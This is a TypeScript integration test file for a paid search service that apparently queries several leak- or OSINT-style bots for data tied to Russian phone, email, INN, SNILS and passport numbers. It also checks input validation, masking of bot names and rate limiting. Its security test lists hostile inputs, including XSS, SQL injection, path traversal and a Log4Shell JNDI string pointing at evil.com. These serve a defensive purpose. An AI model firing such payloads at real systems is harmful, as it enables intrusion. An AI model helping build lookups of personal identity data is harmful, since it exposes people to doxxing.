/**
 * End-to-End Integration Tests
 * Comprehensive testing of all user scenarios and system workflows
 */

import request from 'supertest';
import app from '../../index';
import { SearchType } from '../../types/search';

describe('End-to-End Integration Tests', () => {
  // Test data for different search types
  const testData = {
    phone: {
      valid: ['+79123456789', '89123456789', '79123456789'],
      invalid: ['123', 'invalid-phone', '']
    },
    email: {
      valid: ['test@example.com', 'user.name@domain.co.uk', 'test+tag@gmail.com'],
      invalid: ['invalid-email', '@domain.com', 'test@', '']
    },
    inn: {
      valid: ['1234567890', '123456789012'],
      invalid: ['123', '12345678901234567890', 'invalid-inn', '']
    },
    snils: {
      valid: ['12345678901', '123-456-789 01', '123 456 789 01'],
      invalid: ['123', '12345678901234567890', 'invalid-snils', '']
    },
    passport: {
      valid: ['1234 567890', '1234567890'],
      invalid: ['123', '12345678901234567890', 'invalid-passport', '']
    }
  };

  beforeAll(async () => {
    // Wait for application to be ready
    await new Promise(resolve => setTimeout(resolve, 2000));
  });

  describe('Complete User Journey Tests', () => {
    it('should complete full search workflow for phone number', async () => {
      const phoneNumber = testData.phone.valid[0];
      
      // Step 1: Perform search
      const searchResponse = await request(app)
        .post('/api/search')
        .send({
          type: 'phone',
          value: phoneNumber
        })
        .expect(res => {
          expect(res.status).toBeLessThan(500); // Allow for API failures but not server errors
        });

      if (searchResponse.status === 200) {
        expect(searchResponse.body).toHaveProperty('success', true);
        expect(searchResponse.body).toHaveProperty('data');
        expect(searchResponse.body.data).toHaveProperty('searchId');
        expect(searchResponse.body.data).toHaveProperty('results');
        expect(Array.isArray(searchResponse.body.data.results)).toBe(true);

        // Step 2: Get instructions for bots with data
        const botsWithData = searchResponse.body.data.results.filter((result: any) => result.hasData);
        
        for (const bot of botsWithData) {
          const instructionsResponse = await request(app)
            .get(`/api/instructions/${bot.botId}`)
            .expect(200);

          expect(instructionsResponse.body).toHaveProperty('success', true);
          expect(instructionsResponse.body).toHaveProperty('data');
          expect(instructionsResponse.body.data).toHaveProperty('instructions');
          expect(Array.isArray(instructionsResponse.body.data.instructions)).toBe(true);
        }

        // Step 3: Check search statistics
        const statsResponse = await request(app)
          .get('/api/search/statistics')
          .expect(200);

        expect(statsResponse.body).toHaveProperty('success', true);
        expect(statsResponse.body).toHaveProperty('data');
      }
    });

    it('should handle complete workflow for each search type', async () => {
      const searchTypes: SearchType[] = ['phone', 'email', 'inn', 'snils', 'passport'];
      
      for (const searchType of searchTypes) {
        const testValue = testData[searchType].valid[0];
        
        // Perform search
        const searchResponse = await request(app)
          .post('/api/search')
          .send({
            type: searchType,
            value: testValue
          })
          .expect(res => {
            expect(res.status).toBeLessThan(500);
          });

        if (searchResponse.status === 200) {
          expect(searchResponse.body.data).toHaveProperty('searchType', searchType);
          expect(searchResponse.body.data).toHaveProperty('totalBotsSearched');
          expect(typeof searchResponse.body.data.totalBotsSearched).toBe('number');
        }
      }
    });

    it('should handle error scenarios gracefully', async () => {
      // Test invalid search type
      await request(app)
        .post('/api/search')
        .send({
          type: 'invalid-type',
          value: 'test-value'
        })
        .expect(400);

      // Test missing value
      await request(app)
        .post('/api/search')
        .send({
          type: 'phone'
        })
        .expect(400);

      // Test empty value
      await request(app)
        .post('/api/search')
        .send({
          type: 'phone',
          value: ''
        })
        .expect(400);
    });
  });

  describe('Data Validation Tests', () => {
    it('should validate phone numbers correctly', async () => {
      // Test valid phone numbers
      for (const validPhone of testData.phone.valid) {
        const response = await request(app)
          .post('/api/search')
          .send({
            type: 'phone',
            value: validPhone
          });
        
        expect(response.status).not.toBe(400);
      }

      // Test invalid phone numbers
      for (const invalidPhone of testData.phone.invalid) {
        await request(app)
          .post('/api/search')
          .send({
            type: 'phone',
            value: invalidPhone
          })
          .expect(400);
      }
    });

    it('should validate email addresses correctly', async () => {
      // Test valid emails
      for (const validEmail of testData.email.valid) {
        const response = await request(app)
          .post('/api/search')
          .send({
            type: 'email',
            value: validEmail
          });
        
        expect(response.status).not.toBe(400);
      }

      // Test invalid emails
      for (const invalidEmail of testData.email.invalid) {
        await request(app)
          .post('/api/search')
          .send({
            type: 'email',
            value: invalidEmail
          })
          .expect(400);
      }
    });

    it('should validate INN correctly', async () => {
      // Test valid INNs
      for (const validInn of testData.inn.valid) {
        const response = await request(app)
          .post('/api/search')
          .send({
            type: 'inn',
            value: validInn
          });
        
        expect(response.status).not.toBe(400);
      }

      // Test invalid INNs
      for (const invalidInn of testData.inn.invalid) {
        await request(app)
          .post('/api/search')
          .send({
            type: 'inn',
            value: invalidInn
          })
          .expect(400);
      }
    });

    it('should validate SNILS correctly', async () => {
      // Test valid SNILS
      for (const validSnils of testData.snils.valid) {
        const response = await request(app)
          .post('/api/search')
          .send({
            type: 'snils',
            value: validSnils
          });
        
        expect(response.status).not.toBe(400);
      }

      // Test invalid SNILS
      for (const invalidSnils of testData.snils.invalid) {
        await request(app)
          .post('/api/search')
          .send({
            type: 'snils',
            value: invalidSnils
          })
          .expect(400);
      }
    });

    it('should validate passport numbers correctly', async () => {
      // Test valid passports
      for (const validPassport of testData.passport.valid) {
        const response = await request(app)
          .post('/api/search')
          .send({
            type: 'passport',
            value: validPassport
          });
        
        expect(response.status).not.toBe(400);
      }

      // Test invalid passports
      for (const invalidPassport of testData.passport.invalid) {
        await request(app)
          .post('/api/search')
          .send({
            type: 'passport',
            value: invalidPassport
          })
          .expect(400);
      }
    });
  });

  describe('Bot Name Encryption Tests', () => {
    it('should encrypt bot names in search results', async () => {
      const searchResponse = await request(app)
        .post('/api/search')
        .send({
          type: 'phone',
          value: testData.phone.valid[0]
        });

      if (searchResponse.status === 200 && searchResponse.body.data.results.length > 0) {
        const results = searchResponse.body.data.results;
        
        for (const result of results) {
          expect(result).toHaveProperty('botName');
          expect(typeof result.botName).toBe('string');
          
          // Check that bot names are encrypted (should contain "Бот")
          expect(result.botName).toMatch(/Бот [A-E]/);
          
          // Ensure original bot IDs are not exposed in bot names
          expect(result.botName).not.toContain('dyxless');
          expect(result.botName).not.toContain('itp');
          expect(result.botName).not.toContain('leak_osint');
          expect(result.botName).not.toContain('userbox');
          expect(result.botName).not.toContain('vektor');
        }
      }
    });

    it('should maintain consistent encryption mapping', async () => {
      // Perform multiple searches to ensure consistent encryption
      const searches = await Promise.all([
        request(app).post('/api/search').send({ type: 'phone', value: testData.phone.valid[0] }),
        request(app).post('/api/search').send({ type: 'email', value: testData.email.valid[0] })
      ]);

      const botNameMappings: Record<string, string> = {};

      for (const searchResponse of searches) {
        if (searchResponse.status === 200 && searchResponse.body.data.results.length > 0) {
          for (const result of searchResponse.body.data.results) {
            const botId = result.botId;
            const botName = result.botName;

            if (botNameMappings[botId]) {
              // Ensure consistent mapping
              expect(botNameMappings[botId]).toBe(botName);
            } else {
              botNameMappings[botId] = botName;
            }
          }
        }
      }
    });
  });

  describe('Performance Tests', () => {
    it('should handle concurrent search requests', async () => {
      const concurrentRequests = 5;
      const searchPromises = [];

      for (let i = 0; i < concurrentRequests; i++) {
        const searchPromise = request(app)
          .post('/api/search')
          .send({
            type: 'phone',
            value: testData.phone.valid[i % testData.phone.valid.length]
          });
        searchPromises.push(searchPromise);
      }

      const responses = await Promise.all(searchPromises);

      for (const response of responses) {
        expect(response.status).toBeLessThan(500);
        if (response.status === 200) {
          expect(response.body).toHaveProperty('success', true);
          expect(response.body.meta).toHaveProperty('processingTime');
          expect(typeof response.body.meta.processingTime).toBe('number');
        }
      }
    });

    it('should complete searches within reasonable time limits', async () => {
      const startTime = Date.now();
      
      const response = await request(app)
        .post('/api/search')
        .send({
          type: 'phone',
          value: testData.phone.valid[0]
        });

      const endTime = Date.now();
      const totalTime = endTime - startTime;

      // Should complete within 60 seconds (allowing for API timeouts)
      expect(totalTime).toBeLessThan(60000);

      if (response.status === 200) {
        expect(response.body.meta).toHaveProperty('processingTime');
        expect(response.body.meta.processingTime).toBeLessThan(60000);
      }
    });

    it('should handle rate limiting correctly', async () => {
      // Make multiple rapid requests to test rate limiting
      const rapidRequests = [];
      for (let i = 0; i < 20; i++) {
        rapidRequests.push(
          request(app)
            .post('/api/search')
            .send({
              type: 'phone',
              value: testData.phone.valid[0]
            })
        );
      }

      const responses = await Promise.all(rapidRequests);
      
      // Some requests should be rate limited (429) or succeed (200/other)
      const statusCodes = responses.map(r => r.status);
      const hasRateLimiting = statusCodes.some(code => code === 429);
      const hasSuccessful = statusCodes.some(code => code < 400);

      // Either rate limiting is working or all requests succeeded
      expect(hasRateLimiting || hasSuccessful).toBe(true);
    });
  });

  describe('Security Tests', () => {
    it('should sanitize PII from logs and responses', async () => {
      const sensitiveData = testData.phone.valid[0];
      
      const response = await request(app)
        .post('/api/search')
        .send({
          type: 'phone',
          value: sensitiveData
        });

      // Response should not contain the original sensitive data in plain text
      const responseString = JSON.stringify(response.body);
      expect(responseString).not.toContain(sensitiveData);

      // Check that query is sanitized in response
      if (response.status === 200) {
        expect(response.body.data.query).toMatch(/\[\d+ characters\]/);
      }
    });

    it('should include security headers', async () => {
      const response = await request(app)
        .get('/health')
        .expect(200);

      // Check for security headers
      expect(response.headers).toHaveProperty('x-frame-options');
      expect(response.headers).toHaveProperty('x-content-type-options');
    });

    it('should handle malicious input safely', async () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        '"; DROP TABLE users; --',
        '../../../etc/passwd',
        '${jndi:ldap://evil.com/a}',
        '{{7*7}}',
        'javascript:alert(1)'
      ];

      for (const maliciousInput of maliciousInputs) {
        const response = await request(app)
          .post('/api/search')
          .send({
            type: 'phone',
            value: maliciousInput
          });

        // Should either reject with 400 or handle safely
        expect(response.status).toBeLessThan(500);
        
        if (response.status === 200) {
          // Ensure malicious input is not reflected back
          const responseString = JSON.stringify(response.body);
          expect(responseString).not.toContain('<script>');
          expect(responseString).not.toContain('DROP TABLE');
          expect(responseString).not.toContain('javascript:');
        }
      }
    });
  });

  describe('API Integration Tests', () => {
    it('should handle API failures gracefully', async () => {
      // Test with various inputs that might cause API failures
      const testInputs = [
        { type: 'phone', value: '+1234567890' }, // Non-Russian number
        { type: 'email', value: 'nonexistent@example.com' },
        { type: 'inn', value: '0000000000' } // Invalid INN
      ];

      for (const input of testInputs) {
        const response = await request(app)
          .post('/api/search')
          .send(input);

        // Should not crash the server
        expect(response.status).toBeLessThan(500);

        if (response.status === 200) {
          expect(response.body).toHaveProperty('success', true);
          expect(response.body.data).toHaveProperty('results');
          expect(Array.isArray(response.body.data.results)).toBe(true);
        }
      }
    });

    it('should provide meaningful error messages', async () => {
      const response = await request(app)
        .post('/api/search')
        .send({
          type: 'invalid-type',
          value: 'test'
        })
        .expect(400);

      expect(response.body).toHaveProperty('success', false);
      expect(response.body).toHaveProperty('error');
      expect(response.body.error).toHaveProperty('message');
      expect(typeof response.body.error.message).toBe('string');
      expect(response.body.error.message.length).toBeGreaterThan(0);
    });
  });

  describe('Monitoring and Health Tests', () => {
    it('should provide health check endpoint', async () => {
      const response = await request(app)
        .get('/health')
        .expect(200);

      expect(response.body).toHaveProperty('status', 'OK');
      expect(response.body).toHaveProperty('timestamp');
      expect(response.body).toHaveProperty('service');
    });

    it('should provide monitoring endpoints', async () => {
      // Test monitoring health
      const healthResponse = await request(app)
        .get('/api/monitoring/health')
        .expect(200);

      expect(healthResponse.body).toHaveProperty('status');
      expect(['healthy', 'warning', 'critical']).toContain(healthResponse.body.status);

      // Test monitoring metrics
      const metricsResponse = await request(app)
        .get('/api/monitoring/metrics')
        .expect(200);

      expect(metricsResponse.body).toHaveProperty('metrics');
    });

    it('should track search metrics', async () => {
      // Perform a search to generate metrics
      await request(app)
        .post('/api/search')
        .send({
          type: 'phone',
          value: testData.phone.valid[0]
        });

      // Check if metrics are being tracked
      const metricsResponse = await request(app)
        .get('/api/monitoring/metrics?type=performance')
        .expect(200);

      expect(metricsResponse.body).toHaveProperty('metrics');
      expect(metricsResponse.body.metrics).toHaveProperty('performance');
    });
  });

  describe('Instructions Generation Tests', () => {
    it('should generate instructions for all bot types', async () => {
      const botIds = ['dyxless', 'itp', 'leak_osint', 'userbox', 'vektor'];

      for (const botId of botIds) {
        const response = await request(app)
          .get(`/api/instructions/${botId}`)
          .expect(200);

        expect(response.body).toHaveProperty('success', true);
        expect(response.body).toHaveProperty('data');
        expect(response.body.data).toHaveProperty('instructions');
        expect(Array.isArray(response.body.data.instructions)).toBe(true);
        expect(response.body.data.instructions.length).toBeGreaterThan(0);

        // Check instruction structure
        for (const instruction of response.body.data.instructions) {
          expect(instruction).toHaveProperty('step');
          expect(instruction).toHaveProperty('description');
          expect(typeof instruction.step).toBe('number');
          expect(typeof instruction.description).toBe('string');
        }
      }
    });

    it('should handle invalid bot IDs', async () => {
      await request(app)
        .get('/api/instructions/invalid-bot-id')
        .expect(404);
    });
  });

  describe('Tariffs Integration Tests', () => {
    it('should provide tariff information', async () => {
      const response = await request(app)
        .get('/api/tariffs')
        .expect(200);

      expect(response.body).toHaveProperty('success', true);
      expect(response.body).toHaveProperty('data');
      expect(response.body.data).toHaveProperty('tariffs');
      expect(Array.isArray(response.body.data.tariffs)).toBe(true);
    });
  });

  describe('Error Recovery Tests', () => {
    it('should recover from partial API failures', async () => {
      // This test assumes some APIs might fail but the system should still work
      const response = await request(app)
        .post('/api/search')
        .send({
          type: 'phone',
          value: testData.phone.valid[0]
        });

      // Should not completely fail even if some APIs are down
      expect(response.status).toBeLessThan(500);

      if (response.status === 200) {
        expect(response.body).toHaveProperty('success', true);
        expect(response.body.data).toHaveProperty('results');
        
        // Should have attempted to search all bots
        expect(response.body.data).toHaveProperty('totalBotsSearched');
        expect(response.body.data.totalBotsSearched).toBeGreaterThan(0);
      }
    });
  });
});